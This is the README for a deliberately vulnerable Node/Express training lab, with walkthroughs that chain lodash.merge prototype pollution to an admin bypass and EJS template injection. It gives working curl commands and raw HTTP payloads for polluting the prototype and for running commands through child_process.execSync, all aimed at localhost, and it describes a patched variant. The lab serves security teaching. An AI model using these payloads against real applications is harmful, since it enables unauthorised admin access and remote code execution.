# Parameter Pollution Lab (Node + Express + lodash.merge + EJS)

A small, purpose-built lab to explore parameter/prototype pollution and an end-to-end chain to EJS SSTI. Includes session-based auth and realistic features to make exercises practical.

## Stack
- Node.js, Express 5, EJS
- `lodash.merge` for merging inputs (intentionally unsafe in one endpoint)
- `express-session` for sessions, `multer` for uploads

## Features (4–7 endpoints / 3–5 pages)
- Auth: register, login, logout (sessions)
- Pages: Home, Dashboard (profile), Messages, Upload, Admin (7 total)
- Realistic features: profile update, simple messaging board, file upload

## Quick Start (Windows PowerShell)
```powershell
npm install
npm start
# Open http://localhost:3000
```

To reset in-memory state (users, messages, prototype pollution), stop and restart the server.

## Pages
- `/` Home
- `/auth/register` Register
- `/auth/login` Login
- `/dashboard` Profile (requires login)
- `/messages` Message board (requires login)
- `/upload` File upload (requires login)
- `/admin` Admin page (intentionally vulnerable)

## API / Routes of Interest
- `POST /update-profile` (intentionally vulnerable): uses `_.merge({}, data)` enabling prototype pollution. Also updates profile fields for UX.
- `GET /search` (demo): merges query params into nested defaults with `_.merge` to show parameter pollution effects.

## Lab Walkthroughs

### 1) Prototype Pollution → Admin Bypass → EJS SSTI
This reproduces the classic chain using the intentionally vulnerable routes.

Automatic exploit:
```powershell
sh exploit_admin_bypass.sh
```

Manual steps with curl :
```powershell
# 1. Pollute prototype to set isAdmin=true (vector A)
curl -s -X POST -H "Content-Type: application/json" ^
	-d "{\"__proto__\":{\"isAdmin\":true}}" ^
	http://localhost:3000/update-profile



# 2. Set bio to EJS payload (Windows prints whoami)
curl -s -X POST -H "Content-Type: application/json" 	-d "{\"bio\":\"<%= require('child_process').execSync('whoami').toString() %>\"}" 	http://localhost:3000/update-profile

# 3. Trigger vulnerable admin render
curl -s http://localhost:3000/admin
```

If the chain succeeds, `/admin` renders the command output inside the page.

### 2) Parameter Pollution in Nested Query Defaults
`GET /search` merges query into nested defaults using `lodash.merge`.

Example:
```powershell
curl "http://localhost:3000/search?filters[q]=hello&filters[tags][]=x&filters[tags][]=y&page=5"
```
Response shows how untrusted query can restructure nested `filters`.

### 3) Realistic Features for Practice
- Profile update via Dashboard posts to `POST /update-profile` (same vulnerable code path for the lab).
- Messages at `/messages` store the last messages in-memory.
- Upload at `/upload` saves files to `/uploads` and serves them statically.



## using manual 
Walkthrough

Setup: Open Burp, use the built-in browser (or proxy your browser). You can work entirely in Repeater without capturing traffic.

Step 1: Prototype pollution (proto)


POST /update-profile HTTP/1.1Host: localhost:3000Content-Type: application/jsonContent-Length: 33{"__proto__":{"isAdmin":true}}
Impact: Sets Object.prototype.isAdmin = true. Any user.isAdmin check turns truthy via prototype inheritance across the app until restart.

Step 1b: Alternative vector (constructor.prototype)


POST /update-profile HTTP/1.1Host: localhost:3000Content-Type: application/jsonContent-Length: 56{"constructor":{"prototype":{"isAdmin":true}}}
Impact: Same privilege escalation via a different key path.

Step 2: Store EJS payload in profile bio


POST /update-profile HTTP/1.1Host: localhost:3000Content-Type: application/jsonContent-Length: 94{"bio":"<%= require('child_process').execSync('whoami').toString() %>"}
Impact: Saves a string that will be executed later when the admin template renders with ejs.render(...).

Step 3: Trigger vulnerable admin render


GET /admin HTTP/1.1Host: localhost:3000
Impact: Prototype pollution grants access; EJS evaluates bio with require in scope, executing the command and printing its output in the HTML.
## Patched Variant
- Run the patched server:
```powershell
node .\app.patched.js
```
- Changes in patch: sanitizes dangerous keys, requires own `user.isAdmin`, and uses a safe template `views/admin_patched.ejs`.
- Re-running the exploit should fail to gain admin and will not execute the EJS payload.

